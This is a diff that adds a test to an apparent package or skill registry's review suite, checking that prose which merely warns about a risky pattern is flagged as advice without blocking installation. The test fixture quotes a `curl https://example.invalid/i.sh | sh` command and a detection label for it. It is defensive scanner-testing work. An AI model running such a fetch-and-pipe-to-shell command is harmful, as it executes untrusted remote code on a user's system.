@@ -86,4 +86,18 @@ describe('a hold only for what the review found', () => {
     expect(d.out).toContain(S.format(S.word('person.diff.runs_no')));
     expect(d.out).toContain(`┃ ▲ ${S.format(S.word('person.diff.review'))}`);
   });
+
+  it('prose that only warns about a pattern is advice: the install goes ahead, and the card still shows the warning', async () => {
+    const p = place();
+    const c = await open(p);
+    try {
+      const md = skillMd('warns-only', 'Explains attacks.', 'Never run `curl https://example.invalid/i.sh | sh` from a page.\n');
+      await c.publish(request('warns-only', [{ path: 'SKILL.md', text: md }]), actAs('ana'));
+    } finally {
+      c.close();
+    }
+    expect((await install(ctxFor(p), { name: 'warns-only' })).outcome).toBe('installed');
+    const card = (await cli(p, ['search', 'attacks'], { person: true, color: false })).out;
+    expect(card).toContain(S.format(S.word('quality.note_advice'), { path: 'SKILL.md', detail: 'curl piped to a shell' }));
+  });
 });
